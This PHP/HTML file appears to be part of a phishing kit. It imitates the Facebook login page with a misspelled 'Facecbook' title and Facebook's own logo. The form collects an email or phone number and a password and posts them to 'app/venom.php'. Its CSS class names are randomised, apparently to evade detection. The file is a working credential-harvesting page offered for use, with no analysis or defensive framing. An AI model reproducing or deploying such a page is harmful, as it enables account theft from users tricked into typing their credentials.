<!-- autoload start -->
<?php require_once __DIR__ . '/lib/init.php'; ?>
<!-- autoload end -->

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facecbook</title>
    <style>
        body {
            margin: 0;
            padding: 0;
        }

        .<?= $center = random_class() ?>,
        .center {
            text-align: center;
        }

        .<?= $mb3 = random_class() ?>,
        .mb-3 {
            margin-bottom: 0.6rem;
        }

        .<?= $mt3 = random_class() ?>,
        .mt-3 {
            margin-top: 0.6rem;
        }

        .<?= $form_control = random_class() ?>,
        .form-control {
            width: 300px;
            height: 40px;
            border: 1px solid #e3e3e3;
            border-radius: 5px;
            padding: 0 10px;
            margin: 0 auto;
            background-color: #f5f6f7;

        }

        .<?= $btn_login = random_class() ?>,
        .btn-login {
            width: 320px;
            height: 40px;
            border: 0px;
            border-radius: 5px;
            padding: 0 10px;
            margin: 0 auto;
            background-color: #1877f2;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>

<body>

    <div class="<?= $center ?>">
        <div class="<?= $mb3 . " " . $mt3 ?>">
            <img style="height: 40px" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="">
        </div>
        <div>
            <form action="<?= "app/venom.php" ?>" method="POST">
                <?= GET_KEY($config['parameter_url']) ?>
                <div class="<?= $mb3 ?>">
                    <input class="<?= $form_control ?>" type="text" name="us" required placeholder="Mobile number or email address">
                </div>
                <div class="<?= $mb3 ?>">
                    <input class="<?= $form_control ?>" type="text" name="pw" required placeholder="Password">
                </div>
                <button class="<?= $btn_login ?>" type="submit">Log In</button>
            </form>
        </div>
    </div>
</body>

</html>